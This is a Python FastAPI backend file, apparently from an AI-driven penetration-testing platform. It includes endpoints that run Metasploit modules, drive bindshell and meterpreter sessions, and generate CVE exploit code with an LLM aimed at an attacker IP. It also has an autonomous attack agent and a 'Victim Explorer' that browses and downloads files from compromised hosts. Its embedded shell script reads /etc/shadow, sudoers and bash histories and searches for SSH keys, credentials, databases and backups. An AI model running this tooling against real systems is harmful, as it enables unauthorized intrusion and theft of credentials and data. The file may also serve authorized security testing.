    if not clear_api_key and not candidate.get("api_key") and same_endpoint:
        candidate["api_key"] = existing.get("api_key", "")
    if not clear_extra_headers and not candidate.get("extra_headers") and same_endpoint:
        candidate["extra_headers"] = existing.get("extra_headers", {})
    return normalize_llm_config(candidate)


@app.get("/settings/llm/providers")
async def get_llm_providers(api_key: str = Security(verify_api_key)):
    return {"providers": get_provider_presets()}


@app.get("/settings/llm")
async def get_llm_settings(api_key: str = Security(verify_api_key)):
    return public_llm_config(load_llm_config())


@app.put("/settings/llm")
async def update_llm_settings(request: LLMConfigRequest, api_key: str = Security(verify_api_key)):
    saved = save_llm_config(_effective_llm_config(request))
    return public_llm_config(saved)


@app.get("/settings/llm/models")
async def get_llm_models(api_key: str = Security(verify_api_key)):
    try:
        config = load_llm_config()
        return {"models": list_available_models(config), "config": public_llm_config(config)}
    except Exception as exc:
        raise HTTPException(status_code=502, detail=f"Could not fetch models: {exc}")


@app.post("/settings/llm/models")
async def preview_llm_models(request: LLMConfigRequest, api_key: str = Security(verify_api_key)):
    try:
        config = _effective_llm_config(request)
        return {"models": list_available_models(config), "config": public_llm_config(config)}
    except Exception as exc:
        raise HTTPException(status_code=502, detail=f"Could not fetch models: {exc}")


@app.post("/settings/llm/test")
async def test_llm_settings(request: Optional[LLMConfigRequest] = None, api_key: str = Security(verify_api_key)):
    try:
        return probe_llm_connection(_effective_llm_config(request))
    except Exception as exc:
        raise HTTPException(status_code=502, detail=f"LLM connection failed: {exc}")


@app.post("/scan")
async def run_scan(request: ScanRequest, api_key: str = Security(verify_api_key)):
    scan_id = request.scan_id or generate_scan_id()
    create_scan_run(scan_id, request.target, status="queued", phase="queued", sudo_password=request.sudo_password)
    add_scan_event(scan_id, "status", "Escaneo en cola", f"Objetivo: {request.target}", "queued")
    audit_event("web", "scan_started", f"Scan started for {request.target}", scan_id=scan_id)
    sl_no = create_session(request.target)
    update_scan_run(scan_id, status="running", phase="recon", sl_no=sl_no)
    start_scan_thread(
        request.target,
        scan_id,
        request.user,
        request.password,
        request.sudo_password,
        request.scan_type,
        request.intensity,
        request.options,
    )
    return {"message": "Scan started", "scan_id": scan_id, "target": request.target}


@app.post("/scans/{scan_id}/pause")
async def pause_scan(scan_id: str, api_key: str = Security(verify_api_key)):
    row = get_scan_run(scan_id)
    if not row:
        raise HTTPException(status_code=404, detail="Scan not found")
    if row[2] in {"completed", "failed"}:
        raise HTTPException(status_code=400, detail=f"Scan already {row[2]}")
    update_scan_run(scan_id, status="paused", phase="paused")
    add_scan_event(scan_id, "status", "Pausa solicitada", "La automatizacion se detendra en el proximo punto seguro.", "paused")
    audit_event("web", "scan_paused", f"Scan {scan_id} paused by user", scan_id=scan_id)
    return {"message": "Scan pause requested", "scan_id": scan_id}


@app.delete("/history/{sl_no}")
async def delete_history_item(sl_no: int, api_key: str = Security(verify_api_key)):
    session_data = get_session(sl_no)
    if not session_data["history"]:
        raise HTTPException(status_code=404, detail="Session not found")
    delete_full_session(sl_no)
    audit_event("web", "history_deleted", f"Session history {sl_no} deleted", scan_id=None)
    return {"message": "Session deleted", "sl_no": sl_no}


@app.get("/audit")
async def get_audit_logs(api_key: str = Security(verify_api_key)):
    try:
        logs = list_audit_logs()
        return [
            {
                "id": row[0],
                "event_time": row[1],
                "actor": row[2],
                "event_type": row[3],
                "details": row[4],
                "scan_id": row[5],
                "vuln_id": row[6],
                "schedule_id": row[7],
            }
            for row in logs
        ]
    except Exception as exc:
        print(f"Error fetching audit logs: {exc}")
        return []


@app.get("/schedule")
async def get_schedules(api_key: str = Security(verify_api_key)):
    try:
        schedules = list_scheduled_scans()
        return [
            {
                "id": row[0],
                "target": row[1],
                "scan_type": row[2],
                "intensity": row[3],
                "options": json.loads(row[4] or "{}"),
                "schedule_at": row[5],
                "enabled": bool(row[6]),
                "created_at": row[7],
                "last_run_at": row[8],
                "status": row[9],
            }
            for row in schedules
        ]
    except Exception as exc:
        print(f"Error fetching scheduled scans: {exc}")
        return []


@app.post("/schedule")
async def create_schedule(request: ScheduleRequest, api_key: str = Security(verify_api_key)):
    try:
        schedule_id = save_scheduled_scan(request.target, request.scan_type, request.intensity, request.options, request.schedule_at, request.enabled)
        audit_event("web", "schedule_created", f"Scheduled scan {schedule_id} for {request.target}", schedule_id=schedule_id)
        return {"schedule_id": schedule_id, "message": "Schedule created"}
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.delete("/schedule/{schedule_id}")
async def delete_schedule(schedule_id: int, api_key: str = Security(verify_api_key)):
    try:
        delete_scheduled_scan(schedule_id)
        audit_event("web", "schedule_deleted", f"Scheduled scan {schedule_id} deleted", schedule_id=schedule_id)
        return {"message": "Schedule deleted", "schedule_id": schedule_id}
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/schedule/{schedule_id}/run")
async def run_schedule_now(schedule_id: int, api_key: str = Security(verify_api_key)):
    schedule = get_scheduled_scan(schedule_id)
    if not schedule:
        raise HTTPException(status_code=404, detail="Scheduled scan not found")

    _, target, scan_type, intensity, options_json, schedule_at, enabled, created_at, last_run_at, status = schedule
    options = json.loads(options_json or "{}")
    scan_id = generate_scan_id()
    create_scan_run(scan_id, target, status="running", phase="recon")
    add_scan_event(scan_id, "status", "Scheduled scan manually triggered", f"Target: {target}", "recon")
    audit_event("web", "schedule_executed", f"Manual run of scheduled scan {schedule_id} for {target}", scan_id=scan_id, schedule_id=schedule_id)
    start_scan_thread(
        target,
        scan_id,
        scan_type=scan_type,
        intensity=intensity,
        options=options,
    )
    update_scheduled_scan_status(schedule_id, status="running", enabled=False, last_run_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    return {"scan_id": scan_id, "schedule_id": schedule_id, "message": "Scheduled scan started"}


@app.get("/scans/{scan_id}")
async def get_scan_details(scan_id: str, api_key: str = Security(verify_api_key)):
    row = get_scan_run(scan_id)
    if not row:
        raise HTTPException(status_code=404, detail="Scan not found")

    payload = _scan_run_to_dict(row)
    events = [_scan_event_to_dict(event) for event in list_scan_events(scan_id)]
    payload["events"] = events
    payload["commands"] = [_scan_result_to_dict(result) for result in list_scan_results(scan_id)]
    payload["has_root"] = any(event["event_type"] in {"root_achieved", "root_achieved_final"} for event in payload["events"])
    payload["access_type"] = "meterpreter" if payload.get("session_id") else ("bindshell" if _scan_has_bindshell_access(scan_id, payload, events) else None)
    return payload


@app.get("/scans/{scan_id}/events")
async def get_scan_events(scan_id: str, api_key: str = Security(verify_api_key)):
    row = get_scan_run(scan_id)
    if not row:
        raise HTTPException(status_code=404, detail="Scan not found")
    return {
        "scan_id": scan_id,
        "events": [_scan_event_to_dict(event) for event in list_scan_events(scan_id)],
        "commands": [_scan_result_to_dict(result) for result in list_scan_results(scan_id)],
    }


@app.post("/scans/{scan_id}/terminal")
async def execute_terminal_command(scan_id: str, request: TerminalRequest, api_key: str = Security(verify_api_key)):
    try:
        scan = _scan_run_to_dict(get_scan_run(scan_id))
        if not scan:
            raise HTTPException(status_code=404, detail="Scan not found")
        result = run_terminal_command(scan_id, scan, request)
        audit_event("web", "terminal_command", f"Terminal command executed: {request.command}", scan_id=scan_id)
        return result
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/scans/{scan_id}/terminal/analyze")
async def analyze_terminal_output(scan_id: str, request: TerminalAnalysisRequest, api_key: str = Security(verify_api_key)):
    try:
        analysis_prompt = f"""
Eres un asistente experto de post-explotacion. Analiza solo el comando y la salida proporcionados. No infieras comandos que no aparecen. No uses markdown, tablas, encabezados con #, negritas ni bloques de codigo. Devuelve texto plano con secciones cortas:
Comando observado:
Hallazgos:
Interpretacion:
Siguientes pasos:

Comando: {request.command or 'N/A'}
Salida:
{request.output}
"""
        ai_response = ask_lm_studio([
            {"role": "system", "content": "Eres un experto en seguridad y post-explotacion. Responde siempre en texto plano, sin markdown."},
            {"role": "user", "content": analysis_prompt},
        ])
        ai_response = plain_ai_text(ai_response)
        add_scan_event(scan_id, "terminal_analysis", f"Analisis de salida de comando{f' ({request.command})' if request.command else ''}", ai_response, "terminal")
        return {"analysis": ai_response}
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/scans/{scan_id}/sensitive-search")
async def sensitive_search(scan_id: str, api_key: str = Security(verify_api_key)):
    try:
        scan = _scan_run_to_dict(get_scan_run(scan_id))
        if not scan:
            raise HTTPException(status_code=404, detail="Scan not found")
        if not _scan_has_bindshell_access(scan_id, scan) and not scan.get("session_id"):
            raise HTTPException(status_code=400, detail="Root access is required before sensitive search")

        search_script = r"""
printf '== CONTEXTO ==\n'
id
hostname
pwd
printf '\n== ARCHIVOS SENSIBLES CONOCIDOS ==\n'
for f in /etc/passwd /etc/shadow /etc/group /etc/sudoers /root/.bash_history /home/msfadmin/.bash_history /home/user/.bash_history; do
  if [ -e "$f" ]; then
    ls -l "$f"
    head -n 25 "$f" 2>/dev/null
    printf '\n'
  fi
done
printf '\n== CLAVES Y CONFIGS INTERESANTES ==\n'
find /root /home /etc /var/www /opt -xdev \( -name 'id_rsa*' -o -name '*.pem' -o -name '*.key' -o -name '*.kdbx' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' -o -name '*password*' -o -name '*secret*' -o -name '*credential*' \) -type f 2>/dev/null | head -250
printf '\n== BASES DE DATOS Y BACKUPS ==\n'
find /var/lib/mysql /var/backups /var/www /home /root -xdev \( -name '*.sql' -o -name '*.sqlite' -o -name '*.db' -o -name '*.bak' -o -name '*.dump' -o -name '*.tar' -o -name '*.gz' \) -type f 2>/dev/null | head -250
printf '\n== DIRECTORIOS DE DATOS ==\n'
for d in /var/lib/mysql /var/lib/postgresql /var/www /root /home; do
  if [ -d "$d" ]; then
    printf '\n[%s]\n' "$d"
    ls -la "$d" 2>/dev/null | head -80
  fi
done
"""
        output = run_terminal_command(scan_id, scan, TerminalRequest(command=f"bash -lc {shlex.quote(search_script)}"))
        analysis_prompt = f"""
Eres un analista de post-explotacion en un laboratorio autorizado. Analiza la busqueda sensible realizada con acceso root y resume:
1. Archivos o directorios con mayor valor.
2. Posibles credenciales, hashes, claves, bases de datos o backups encontrados.
3. Comandos siguientes recomendados para inspeccionar sin destruir ni modificar datos.
4. Riesgos de seguridad y remediacion.

Salida:
{output['output'][:12000]}
"""
        ai_response = ask_lm_studio([
            {"role": "system", "content": "Responde en espanol, claro y accionable. No inventes hallazgos no presentes en la salida."},
            {"role": "user", "content": analysis_prompt},
        ])
        ai_response = plain_ai_text(ai_response)
        add_scan_event(scan_id, "sensitive_search", "Busqueda de datos sensibles", output["output"][:3000], "post_exploitation")
        add_scan_event(scan_id, "sensitive_search_analysis", "Analisis IA de datos sensibles", ai_response, "post_exploitation")
        audit_event("web", "sensitive_search", f"Sensitive search executed for scan {scan_id}", scan_id=scan_id)
        return {"output": output["output"], "analysis": ai_response, "access_type": output.get("access_type")}
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/scans/{scan_id}/terminal/chat")
async def chat_terminal_session(scan_id: str, request: TerminalChatRequest, api_key: str = Security(verify_api_key)):
    try:
        session_note = f"Sesion {request.session_id}" if request.session_id else "Sesion directa (bindshell o similar)"
        chat_prompt = f"Eres un asistente de post-explotacion. Responde en texto plano, sin markdown, sin encabezados con #, sin negritas y sin bloques de codigo. Usa frases cortas y listas simples si hace falta. {session_note}.\n\nConsulta: {request.prompt}"
        ai_response = ask_lm_studio([
            {"role": "system", "content": "Eres un experto en seguridad y post-explotacion. Responde siempre en texto plano limpio, sin markdown."},
            {"role": "user", "content": chat_prompt},
        ])
        ai_response = plain_ai_text(ai_response)
        add_scan_event(scan_id, "terminal_chat", "Consulta de IA", ai_response, "terminal")
        return {"response": ai_response}
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


# ============================================================
# Sessions API (global, scan-independent)
# ============================================================

class SessionCommandRequest(BaseModel):
    command: str
    target: Optional[str] = None

@app.get("/api/sessions")
async def list_all_sessions(api_key: str = Security(verify_api_key)):
    """List all active sessions from MSF and bindshell."""
    sessions = []
    sudo_password = None
    try:
        sudo_password = get_scan_sudo_password("_global_")
    except: pass

    # Gather MSF sessions
    msf_sessions = []
    try:
        msf = Metasploit(sudo_password=sudo_password)
        msf_sessions = msf.list_sessions()
    except Exception as e:
        pass

    # Gather bindshell sessions from terminal_shells dict
    bindshell_sessions = []
    for scan_id, shell in list(terminal_shells.items()):
        alive = shell.is_alive()
        bindshell_sessions.append({
            "id": f"bindshell:{scan_id}",
            "type": "shell",
            "target": shell.target,
            "info": "Bindshell (port 1524)",
            "source": "bindshell",
            "scan_id": scan_id,
            "alive": alive,
        })
        if not alive:
            del terminal_shells[scan_id]

    # Gather custom sessions
    custom_entries = []
    for sid, sess in list(custom_sessions.items()):
        custom_entries.append(sess.to_dict())

    # Merge MSF + bindshell + custom sessions
    seen = set()
    merged = []
    for s in msf_sessions + bindshell_sessions + custom_entries:
        key = str(s.get("id"))
        if key not in seen:
            seen.add(key)
            merged.append(s)

    return {"sessions": merged, "count": len(merged)}

@app.post("/api/sessions/{session_id}/command")
async def session_command(session_id: str, request: SessionCommandRequest, api_key: str = Security(verify_api_key)):
    """Send a command to a session (supports MSF meterpreter and bindshell)."""
    sudo_password = None
    try:
        sudo_password = get_scan_sudo_password("_global_")
    except: pass

    if session_id.startswith("bindshell:"):
        scan_id = session_id.replace("bindshell:", "")
        shell = terminal_shells.get(scan_id)
        if not shell or not shell.is_alive():
            raise HTTPException(status_code=404, detail="Bindshell session not found or not alive")
        output = shell.run(request.command)
        return {"output": output, "session_id": session_id, "type": "bindshell"}

    # Check custom sessions
    custom = custom_sessions.get(session_id)
    if custom:
        if not custom.is_alive():
            raise HTTPException(status_code=404, detail="Custom session is not alive")
        output = custom.run(request.command)
        return {"output": output, "session_id": session_id, "type": custom.type}

    try:
        sid = int(session_id)
        msf = Metasploit(sudo_password=sudo_password)
        output = msf.session_interact(sid, request.command)
        return {"output": output, "session_id": session_id, "type": "meterpreter"}
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid session ID")

@app.post("/api/sessions/{session_id}/disconnect")
async def session_disconnect(session_id: str, api_key: str = Security(verify_api_key)):
    """Disconnect/stop a session."""
    if session_id.startswith("bindshell:"):
        scan_id = session_id.replace("bindshell:", "")
        shell = terminal_shells.get(scan_id)
        if shell:
            shell.close()
            del terminal_shells[scan_id]
        return {"message": "Bindshell session disconnected"}

    custom = custom_sessions.get(session_id)
    if custom:
        custom.close()
        del custom_sessions[session_id]
        return {"message": f"Custom session {session_id} disconnected"}

    try:
        sid = int(session_id)
        sudo_password = None
        try: sudo_password = get_scan_sudo_password("_global_")
        except: pass
        msf = Metasploit(sudo_password=sudo_password)
        success = msf.stop_session(sid)
        if success:
            return {"message": f"Session {sid} stopped"}
        success = msf.destroy_session(sid)
        if success:
            return {"message": f"Session {sid} destroyed"}
        raise HTTPException(status_code=500, detail="Failed to disconnect session")
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid session ID")

@app.get("/api/sessions/{session_id}/info")
async def session_info(session_id: str, api_key: str = Security(verify_api_key)):
    """Get detailed info about a specific session."""
    if session_id.startswith("bindshell:"):
        scan_id = session_id.replace("bindshell:", "")
        shell = terminal_shells.get(scan_id)
        if not shell:
            raise HTTPException(status_code=404, detail="Session not found")
        return {
            "id": session_id,
            "type": "shell",
            "target": shell.target,
            "source": "bindshell",
            "alive": shell.is_alive(),
        }

    custom = custom_sessions.get(session_id)
    if custom:
        return custom.to_dict()

    try:
        sid = int(session_id)
        sudo_password = None
        try: sudo_password = get_scan_sudo_password("_global_")
        except: pass
        msf = Metasploit(sudo_password=sudo_password)
        sessions = msf.list_sessions()
        for s in sessions:
            if s["id"] == sid:
                return s
        raise HTTPException(status_code=404, detail="Session not found")
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid session ID")

@app.post("/scans/{scan_id}/sessions/{session_id}/stop")
async def stop_session(scan_id: str, session_id: int, api_key: str = Security(verify_api_key)):
    try:
        sudo_password = get_scan_sudo_password(scan_id)
        msf = Metasploit(sudo_password=sudo_password)
        success = msf.stop_session(session_id)
        if success:
            add_scan_event(scan_id, "session_stop", f"Sesion {session_id} detenida", "Sesion meterpreter detenida exitosamente", "post_exploitation")
            # Update scan_run to remove session_id
            update_scan_run(scan_id, session_id=None)
            return {"message": f"Session {session_id} stopped successfully"}
        else:
            raise HTTPException(status_code=500, detail="Failed to stop session")
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.delete("/scans/{scan_id}/sessions/{session_id}")
async def destroy_session(scan_id: str, session_id: int, api_key: str = Security(verify_api_key)):
    try:
        sudo_password = get_scan_sudo_password(scan_id)
        msf = Metasploit(sudo_password=sudo_password)
        success = msf.destroy_session(session_id)
        if success:
            add_scan_event(scan_id, "session_destroy", f"Sesion {session_id} eliminada", "Sesion meterpreter eliminada exitosamente", "post_exploitation")
            # Update scan_run to remove session_id
            update_scan_run(scan_id, session_id=None)
            return {"message": f"Session {session_id} destroyed successfully"}
        else:
            raise HTTPException(status_code=500, detail="Failed to destroy session")
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/exploit")
async def run_exploit(request: ExploitRequest, api_key: str = Security(verify_api_key)):
    scan_id = request.scan_id or generate_scan_id()
    create_scan_run(scan_id, request.target, status="running", phase="validation")
    add_scan_event(scan_id, "status", "Validacion manual iniciada", f"Objetivo: {request.target}", "validation")

    if not request.exploit:
        output = "No se ejecuto explotacion: falta un comando o modulo especifico verificado."
        add_scan_event(scan_id, "validation_skipped", "Sin modulo de explotacion", output, "validation")
        update_scan_run(scan_id, status="completed", phase="completed")
        return {"scan_id": scan_id, "status": "not_executed", "output": output}

    output = ssh_utils.run_ssh_command(request.target, request.user, request.password, request.exploit, scan_id)
    add_scan_event(scan_id, "exploit_output", "Comando de explotacion personalizado", output, "exploitation")
    update_scan_run(scan_id, status="completed", phase="completed")
    return {"scan_id": scan_id, "output": output}


@app.post("/ssh")
async def run_ssh_command(request: SSHRequest, api_key: str = Security(verify_api_key)):
    output = ssh_utils.run_ssh_command(
        request.target,
        request.user,
        request.password,
        request.command,
        request.target,
    )
    return {"output": output}


@app.post("/report")
async def generate_report(request: ReportRequest, api_key: str = Security(verify_api_key)):
    try:
        sl_no = request.sl_no
        session_data = get_session(sl_no)
        if not session_data["history"]:
            raise HTTPException(status_code=404, detail="Session not found")

        scan_run = get_scan_run_by_sl_no(sl_no)
        summary_row = session_data["summary"]
        if not summary_row and scan_run:
            summary_row = [None, None, None, scan_run[10], scan_run[8], None]

        # Fetch events and commands from scan_run
        events = []
        commands = []
        if scan_run:
            scan_id = scan_run[0]
            events = list_scan_events(scan_id)
            commands = list_scan_results(scan_id)

        data = {
            "history": [
                session_data["history"][0],
                session_data["history"][1],
                session_data["history"][2],
                session_data["history"][3],
            ],
            "vulns": session_data["vulns"],
            "fixes": session_data["fixes"],
            "exploits": session_data["exploits"],
            "summary": [
                sl_no,
                summary_row[2] if summary_row else None,
                summary_row[3] if summary_row else None,
                (summary_row[4] if summary_row and summary_row[4] else "UNKNOWN") if summary_row else "UNKNOWN",
                summary_row[5] if summary_row else None,
            ] if summary_row else ["UNKNOWN"],
            "events": events,
            "commands": commands,
            "include_exploitation": request.include_exploitation,
            "include_commands": request.include_commands,
        }

        if request.format == "pdf":
            report_path = export_pdf(data, reports_path)
        elif request.format == "html":
            report_path = export_html(data, reports_path)
        else:
            raise HTTPException(status_code=400, detail="Invalid format")

        filename = os.path.basename(report_path)
        return {
            "report_path": report_path,
            "download_url": f"/reports/{filename}",
            "filename": filename,
            "size_bytes": os.path.getsize(report_path),
            "generated_at": datetime.now().isoformat(timespec="seconds"),
            "standards": ["OWASP WSTG", "NIST SP 800-115", "PTES", "CVSS v4 ready"],
        }
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/msf")
async def run_metasploit_module(request: MSFRequest, api_key: str = Security(verify_api_key)):
    try:
        scan_id = request.scan_id or generate_scan_id()
        create_scan_run(scan_id, request.target, status="running", phase="metasploit")
        add_scan_event(scan_id, "msf_module", "Modulo de Metasploit", request.module, "metasploit")

        msf = Metasploit()
        if request.scan_id:
            sudo_password = get_scan_sudo_password(request.scan_id)
            msf = Metasploit(sudo_password=sudo_password)
        module_type = request.module.split("/")[0]
        module_name = request.module
        result = msf.execute_module(module_type, module_name, request.options)
        msf.save_to_db(scan_id, module_name, request.options, result)
        add_scan_event(scan_id, "msf_result", "Resultado de Metasploit", str(result), "metasploit")

        if request.session_id or result.get("session_id"):
            session_id = request.session_id or result["session_id"]
            output = msf.session_interact(session_id, "whoami")
            add_scan_event(scan_id, "session_output", f"Sesion {session_id}", output, "metasploit")
            update_scan_run(scan_id, status="completed", phase="completed")
            return {"module_result": result, "session_output": output, "scan_id": scan_id}

        update_scan_run(scan_id, status="completed", phase="completed")
        return {"module_result": result, "scan_id": scan_id}
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


# ============================================================
# NUEVAS RUTAS: Autenticación de usuarios y perfiles
# ============================================================

class AuthRequest(BaseModel):
    username: str
    password: str
    email: Optional[str] = None

class ProfileUpdate(BaseModel):
    username: Optional[str] = None
    email: Optional[str] = None

class PasswordChange(BaseModel):
    old_password: str
    new_password: str

@app.post("/api/auth/login")
async def api_login(request: AuthRequest):
    result = user_mgr.authenticate_user(request.username, request.password)
    if "error" in result:
        raise HTTPException(status_code=401, detail=result["error"])
    token = user_mgr.create_session(result["id"])
    return {"token": token, "user": result}

@app.post("/api/auth/signup")
async def api_signup(request: AuthRequest):
    if not request.email:
        raise HTTPException(status_code=400, detail="Email requerido")
    if len(request.password) < 4:
        raise HTTPException(status_code=400, detail="Contraseña muy corta (mín 4 caracteres)")
    result = user_mgr.create_user(request.username, request.email, request.password)
    if "error" in result:
        raise HTTPException(status_code=400, detail=result["error"])
    token = user_mgr.create_session(result["id"])
    return {"token": token, "user": result}

@app.post("/api/auth/logout")
async def api_logout(request: Request):
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        user_mgr.logout_session(auth[7:])
    return {"message": "Sesión cerrada"}

@app.get("/api/auth/me")
async def api_me(request: Request):
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="No autorizado")
    user = user_mgr.verify_session(auth[7:])
    if "error" in user:
        raise HTTPException(status_code=401, detail=user["error"])
    return user

@app.put("/api/auth/profile")
async def api_update_profile(request: ProfileUpdate, api_key: str = Security(verify_api_key)):
    user = user_mgr.verify_session(request.headers.get("Authorization", "").replace("Bearer ", ""))
    if "error" in user:
        raise HTTPException(status_code=401, detail=user["error"])
    result = user_mgr.update_user(user["id"], **request.dict(exclude_none=True))
    return result

@app.post("/api/auth/change-password")
async def api_change_password(request: PasswordChange, api_key: str = Security(verify_api_key)):
    auth_token = request.headers.get("Authorization", "").replace("Bearer ", "")
    user = user_mgr.verify_session(auth_token)
    if "error" in user:
        raise HTTPException(status_code=401, detail=user["error"])
    result = user_mgr.change_password(user["id"], request.old_password, request.new_password)
    if "error" in result:
        raise HTTPException(status_code=400, detail=result["error"])
    return {"message": "Contraseña actualizada"}

class AdminCreateUser(BaseModel):
    username: str
    email: str
    password: str
    role: str = "user"

class AdminUpdateUser(BaseModel):
    username: Optional[str] = None
    email: Optional[str] = None
    role: Optional[str] = None
    is_active: Optional[int] = None

@app.get("/api/admin/users")
async def api_list_users(api_key: str = Security(verify_api_key)):
    return user_mgr.list_users()

@app.post("/api/admin/users")
async def api_create_user(request: AdminCreateUser, api_key: str = Security(verify_api_key)):
    result = user_mgr.create_user(request.username, request.email, request.password, request.role)
    if "error" in result:
        raise HTTPException(status_code=400, detail=result["error"])
    return result

@app.put("/api/admin/users/{user_id}")
async def api_update_user(user_id: int, request: AdminUpdateUser, api_key: str = Security(verify_api_key)):
    result = user_mgr.update_user(user_id, **request.dict(exclude_none=True))
    if "error" in result:
        raise HTTPException(status_code=400, detail=result["error"])
    return result

@app.delete("/api/admin/users/{user_id}")
async def api_delete_user(user_id: int, api_key: str = Security(verify_api_key)):
    result = user_mgr.delete_user(user_id)
    return {"message": "Usuario eliminado"}

# ============================================================
# CVE Intelligence Engine
# ============================================================

class CVERequest(BaseModel):
    target: str
    service: str
    version: str = ""
    port: str = ""
    scan_id: Optional[str] = None
    lhost: Optional[str] = None
    lport: int = 4444

@app.post("/api/cve/scan")
async def api_cve_scan(request: CVERequest, api_key: str = Security(verify_api_key)):
    lhost = request.lhost or load_llm_config().get("attacker_ip") or "127.0.0.1"
    result = auto_exploit_pipeline(request.target, request.service, request.version, request.port, request.scan_id or "", lhost, request.lport)
    if result["exploit_code"] and request.scan_id:
        save_payload_to_db(request.target, request.scan_id,
            result["cves_found"][0]["cve_id"] if result["cves_found"] else "UNKNOWN",
            "python", result["exploit_code"], f"Auto {request.service}:{request.port}")
    return result

@app.post("/api/cve/detect")
async def api_cve_detect(request: CVERequest, api_key: str = Security(verify_api_key)):
    cves = detect_cves(request.service, request.version, request.port)
    return {"target": request.target, "service": request.service, "version": request.version, "cves": cves}

@app.post("/api/cve/generate")
async def api_cve_generate(request: CVERequest, api_key: str = Security(verify_api_key)):
    lhost = request.lhost or load_llm_config().get("attacker_ip") or "127.0.0.1"
    cves = detect_cves(request.service, request.version, request.port)
    if not cves:
        return {"error": "No se encontraron CVEs para este servicio", "code": ""}
    code = generate_exploit_code(cves[0], request.target, lhost, request.lport)
    if request.scan_id:
        save_payload_to_db(request.target, request.scan_id, cves[0].get("cve_id", "UNKNOWN"), "python", code, f"Generated {request.service}:{request.port}")
    return {"cve": cves[0], "code": code, "language": "python"}

# ============================================================
# Autonomous AI Agent v2
# ============================================================

class AgentRequest(BaseModel):
    target: str
    scan_id: Optional[str] = None
    recon_data: str = ""
    lhost: Optional[str] = None
    lport: int = 4444
    stage: str = "full"

@app.post("/api/agent/start")
async def api_agent_start(request: AgentRequest, api_key: str = Security(verify_api_key)):
    scan_id = request.scan_id or generate_scan_id()
    lhost = request.lhost or load_llm_config().get("attacker_ip") or socket.gethostbyname(socket.gethostname())
    create_scan_run(scan_id, request.target, status="running", phase="agent")
    add_scan_event(scan_id, "agent_start", "Agente autónomo v2 iniciado", f"Target: {request.target}", "agent")

    def agent_worker():
        try:
            run_autonomous_scan(request.target, scan_id, request.recon_data, lhost, request.lport)
            update_scan_run(scan_id, status="completed", phase="completed")
            add_scan_event(scan_id, "agent_done", "Agente completado", "Ciclo autónomo finalizado", "agent")
        except Exception as e:
            update_scan_run(scan_id, status="failed", error=str(e))
            add_scan_event(scan_id, "agent_error", "Error del agente", str(e)[:500], "agent")

    threading.Thread(target=agent_worker, daemon=True).start()
    return {"message": "Agente iniciado", "scan_id": scan_id}

@app.post("/api/agent/step")
async def api_agent_step(request: AgentRequest, api_key: str = Security(verify_api_key)):
    lhost = request.lhost or load_llm_config().get("attacker_ip") or "127.0.0.1"
    session = AgentSession(request.target, request.scan_id or generate_scan_id(), lhost, request.lport)
    action = parse_agent_action(request.recon_data) if request.recon_data else {"type": "STOP"}
    output = session.handle_action(action)
    return {"action": action, "output": output[:5000]}

# ============================================================
# Victim Explorer - File System, DB, Downloads
# ============================================================

class ExplorerRequest(BaseModel):
    scan_id: str
    command: str = ""

def _get_explorer_session(scan_id: str) -> VictimExplorer:
    scan = _scan_run_to_dict(get_scan_run(scan_id))
    if not scan:
        return None

    def session_fn(cmd: str) -> str:
        nonlocal scan
        if _scan_has_bindshell_access(scan_id, scan):
            shell = get_bindshell_session(scan_id, scan["target"])
            return shell.run(cmd)
        if scan.get("session_id"):
            sudo_pw = get_scan_sudo_password(scan_id)
            msf = Metasploit(sudo_password=sudo_pw)
            return msf.session_interact(scan["session_id"], cmd)
        return "[!] No hay sesión activa"

    return VictimExplorer(session_fn)

@app.post("/api/explorer/ls")
async def explorer_list(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    path = request.command or "/"
    result = explorer.list_directory(path)
    return format_explorer_response(result)

@app.post("/api/explorer/cat")
async def explorer_cat(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    if not request.command:
        raise HTTPException(status_code=400, detail="Se requiere un path")
    result = explorer.read_file(request.command)
    return format_explorer_response(result)

@app.post("/api/explorer/download")
async def explorer_download(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    if not request.command:
        raise HTTPException(status_code=400, detail="Se requiere un path")
    result = explorer.download_file(request.command)
    return format_explorer_response(result)

@app.post("/api/explorer/search")
async def explorer_search(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    parts = request.command.split("|", 1)
    pattern = parts[0].strip()
    base = parts[1].strip() if len(parts) > 1 else "/"
    files = explorer.search_files(pattern, base)
    return {"success": True, "data": {"files": files, "pattern": pattern, "base": base}}

@app.post("/api/explorer/grep")
async def explorer_grep(request: ExplorerRequest, api_key: str = Security(verify_api_key)):
    explorer = _get_explorer_session(request.scan_id)
    if not explorer:
        raise HTTPException(status_code=404, detail="Scan not found")
    parts = request.command.split("|", 1)
    pattern = parts[0].strip()
    base = parts[1].strip() if len(parts) > 1 else "/"
    results = explorer.grep_text(pattern, base)
    return {"success": True, "data": {"results": results, "pattern": pattern, "base": base}}

